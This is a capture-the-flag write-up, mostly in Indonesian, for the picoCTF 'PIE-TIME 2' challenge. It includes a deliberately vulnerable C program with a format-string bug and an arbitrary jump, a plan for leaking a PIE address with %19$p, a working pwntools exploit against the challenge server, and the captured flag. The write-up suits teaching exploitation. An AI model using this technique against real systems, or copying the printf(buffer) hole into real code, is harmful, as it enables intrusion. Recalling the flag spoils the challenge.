# PIE-TIME 2
## Problem
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```
## Analisis
Hasil checksec:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   81 Symbols	  No	0		2		vuln
```
hasilnya:
* Stack canary tidak relevan karena tidak ada celah untuk overflow
* No eXecute tidak relevan karena tidak ada ruang yang cukup untuk menyuntikan shellcode
* PIE membuatkita harus mendapatkan leak address
## Rencana
Langkah:
* Spam %p. untuk mendapatkan leak address (offset return address ada di 19)
* Dapatkan leak address return address dan juga selisih antara return address dan juga win address
```
return_address - win_address = 0xD7
win_address = return_address - 0xD7
```
* Print nilai win_address
* input win_address

## Payload
```
from pwn import *

# Adjust these to match your binary
context.binary = './vuln'
# context.log_level = 'debug'

# Uncomment for remote:
p = remote('rescued-float.picoctf.net', 52320)
#p = process('./vuln')

# Receive the welcome message
p.recvuntil(b'Enter your name:')

# Send the format string to leak canary, saved RBP, and return address
payload = b'%19$p.%18$p.%17$p.'
p.sendline(payload)

# Parse the response
#p.recvuntil(b'You heard in the distance: ')
leak = p.recvline().strip().decode()

# Split on dots
parts = leak.split('.')
return_address = int(parts[0], 16)      # %19$p
saved_prior_rbp = int(parts[1], 16)     # %18$p
canary = int(parts[2], 16)              # %17$p

win_address = return_address - 0xD7
ret_addr_loc = saved_prior_rbp - 0x8

log.info(f"Return address:     {hex(return_address)}")
log.info(f"Saved prior RBP:    {hex(saved_prior_rbp)}")
log.info(f"Canary:             {hex(canary)}")
log.info(f"")
log.info(f"Win address:        {hex(win_address)}")

p.interactive()
```

## Hasil
```
[*] '/home/baba/Documents/picoctf/PIE_TIME_2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to rescued-float.picoctf.net on port 52320: Done
[*] Return address:     0x5885044ec441
[*] Saved prior RBP:    0x7ffd3964c1f0
[*] Canary:             0xc512d0a634487e00
[*] 
[*] Win address:        0x5885044ec36a
[*] Switching to interactive mode
 enter the address to jump to, ex => 0x12345: $ 0x5885044ec36a
You won!
picoCTF{p13_5h0u1dn'7_134k_9650b792}

[*] Got EOF while reading in interactive
$ 
$ 
[*] Interrupted
[*] Closed connection to rescued-float.picoctf.net port 52320

```